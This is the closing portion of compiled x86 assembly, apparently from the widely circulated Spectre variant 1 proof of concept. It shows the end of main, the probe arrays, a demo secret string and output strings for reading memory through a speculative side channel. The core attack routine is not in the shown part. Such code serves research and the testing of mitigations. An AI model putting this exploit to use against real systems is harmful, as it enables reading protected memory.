	addb	$-32, %cl
	cmpb	$95, %cl
	movl	$63, %ecx
	cmovbl	%eax, %ecx
	leal	.L.str.11@GOTOFF(%edi), %edx
	movl	%edi, %ebx
	pushl	%ebp
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	jmp	.LBB3_9
.LBB3_45:
	xorl	%eax, %eax
	addl	$76, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
